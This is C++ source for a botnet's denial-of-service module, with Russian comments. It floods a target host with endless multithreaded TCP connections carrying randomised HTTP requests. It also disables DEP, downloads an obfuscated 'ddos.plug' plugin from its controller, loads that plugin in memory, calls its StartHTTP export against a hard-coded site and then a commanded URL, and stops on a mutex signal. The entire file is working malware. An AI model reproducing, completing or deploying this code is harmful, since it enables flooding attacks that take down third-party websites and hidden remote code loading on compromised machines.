#include "ddos.h"
#include "Plugins.h"
#include "Utils.h"







TDDOS::TDDOS()
{
	MaxThreads = 10;
}

TDDOS::~TDDOS()
{

}

bool TDDOS::Execute()
{
	if (URL.IsEmpty() || MaxThreads == 0)
		return false;

	// Инициализируем запрос
	FRequest.CloseConnection = true;
	FRequest.SetURL(URL.t_str());
	if (FRequest.Host.IsEmpty())
		return false;

	FRequest.UserAgent = "Mozilla Compatible %s";
	FRequest.Referer = "http://%s";

	FSendData = FRequest.MakeRequestHeaders();

	// Инициализируем библиотеку сокетов
	if (!InitializeWSA()) return false;

	// Получаем  адрес по имени хоста
	FHostAddres = (LPHOSTENT)pgethostbyname(FRequest.Host.t_str());

	if ( FHostAddres == NULL )
		return false;

	// Запускаем потоки
	for (int i = 0; i < MaxThreads; i++)
	{
		StartThread(DDOSThreadProc, this);
	}


	while (1)  pSleep(100);


	return true;
}
//----------------------------------------------------------------------------


// Функция выполнения многократного подключения к испытуемому сайту
DWORD WINAPI DDOSThreadProc(TDDOS *DDOS)
{

	DWORD BufSize = 1024;
	TMemory Buf(BufSize);

	while (true)
	{
		// Создаём сокет
		SOCKET Socket = (SOCKET)psocket(AF_INET, SOCK_STREAM, 0);

		if(Socket != SOCKET_ERROR)
		{
			// Подключаемся к серверу
			struct sockaddr_in SockAddr;
			SockAddr.sin_family		 = AF_INET;
			SockAddr.sin_addr.s_addr = **(unsigned long**)DDOS->FHostAddres->h_addr_list;
			SockAddr.sin_port		 = HTONS((unsigned short)DDOS->FRequest.Port);

			// подключаемся к сокету
			if ( (int)pconnect(Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) != SOCKET_ERROR )
			{
				// Отправляем данные
				string S;
				string Temp = Random::RandomString2(30, 'a', 'z');
                string Temp2 = Random::RandomString2(30, 'a', 'z');
				S.Format(DDOS->FSendData.t_str(), Temp.t_str(), Temp2.t_str());

				int Size = (int)psend(Socket, S.t_str(), S.Length(), 0);

				// Для увеличения нагрузки на сервер пытаемся получить от сервера ответ
				if (Size == S.Length())
				{
//					Size = (int)precv(Socket, Buf.Buf(), BufSize, 0);
//					PCHAR S = Buf;
//					Size++;
                }


			}
			pclosesocket(Socket);
		}
		else
		{
			pSleep(10);
		}

		// Ждём до следующей отправки
		pSleep(1);
    }

	return 0;
}

//----------------------------------------------------------------------------









typedef struct
{
	char* URL;
	char* Count;
	
} DDos, * PDDos;

DWORD WINAPI RunDDOSThread( LPVOID lpData )
{
	DisableDEP();

	if ( !lpData )
	{
		return 0;
	}

	PDDos pData = (PDDos)lpData;



	char DDOSPlugin[] = {'d','d','o','s','.','p','l','u','g',0};


	DWORD dwModuleSize = 0;
	LPBYTE BotModule   = Plugin::Download(DDOSPlugin, NULL, &dwModuleSize);
	if (BotModule == NULL)
		return 0;


//	PCHAR FN = "c:\\temp\\ddos.dll";
//	File::WriteBufferA(FN, BotModule,  dwModuleSize);
//	LoadLibraryA(FN);


	int Count = m_atoi(pData->Count);
	HMEMORYMODULE HHandle = MemoryLoadLibrary(BotModule);
	typedef int (WINAPIV*TMethod)(char*,int);
	TMethod M = (TMethod)MemoryGetProcAddress(HHandle, (PCHAR)"StartHTTP");
	int R;
	if (M != NULL) 
		R = M("http://yandex.ru\0", Count);

	HANDLE tmp;
	while ( 1 )// ждем команды на выключение
	{
		tmp= (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS,false, "DDOS");
		if ((DWORD)pWaitForSingleObject(tmp, INFINITE))
		{
			pSleep(100);
		}
		else break;
	}

	
	M(pData->URL,0);//вызываем эту же функцию с другими параметрами
	pCloseHandle(tmp);
	MemFree(BotModule);
	STR::Free(pData->URL);
	STR::Free(pData->Count);
	
	
	return 0;

}

bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
		// Запуск потока DDOS
	PCHAR Argums = Args;
	PDDos V = CreateStruct(DDos);
	if (Args[0]=='s'&&Args[1]=='t'&&Args[2]=='o'&&Args[3]=='p')
	{
		HANDLE MutexHandle=(HANDLE)pCreateMutexA(NULL,false,"DDOS");//прекращаем ддос
		pSleep(1000); 
		pCloseHandle(MutexHandle);
	}

	V->URL=STR::GetLeftStr(Argums, " ");
	V->Count=STR::GetRightStr(Argums, " ");

	   
	return ((StartThread(RunDDOSThread, V)) ? (true) : (false));


}